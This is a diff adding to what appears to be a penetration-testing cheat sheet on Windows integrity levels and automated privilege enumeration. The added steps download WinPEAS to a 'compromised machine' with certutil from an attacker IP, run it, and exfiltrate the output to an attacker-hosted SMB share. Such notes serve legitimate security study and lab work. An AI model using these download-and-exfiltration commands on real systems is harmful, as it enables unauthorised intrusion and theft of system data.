@@ -75,3 +75,64 @@ wmic product get Caption, Description, InstallLocation, Name  # Filtered applica
 accesschk.exe -uws "Users" "C:\Program Files" --accepteula
 ```
 
+# Windows Integrity Levels and Privilege Automation
+
+---
+
+## Windows Integrity Levels
+
+### Check Integrity Level - Files and Binaries
+
+```bash
+icacls example.txt
+icacls cmd.exe
+```
+
+---
+
+### Check Integrity Level - Current User
+
+```bash
+whoami /groups
+```
+
+---
+
+## Automation - Windows Privilege Enumeration (Awesome Script)
+
+### Recommended Tool: WinPEAS
+
+---
+
+### Step 1 - Download WinPEAS to Compromised Machine
+
+```bash
+certutil -f urlcache http://10.10.x.x/winpease.exe
+```
+
+---
+
+### Step 2 - Run WinPEAS and Save Output
+
+```bash
+winpease.exe > win.txt
+```
+
+---
+
+### Step 3 - Set up SMB Share on Attacker Machine (Kali)
+
+```bash
+impacket-smbserver share .
+```
+
+---
+
+### Step 4 - Exfiltrate Output to Attacker Machine via SMB
+
+```bash
+copy win.txt \\attacker_machine_ip\share\win.txt
+```
+
+---
+
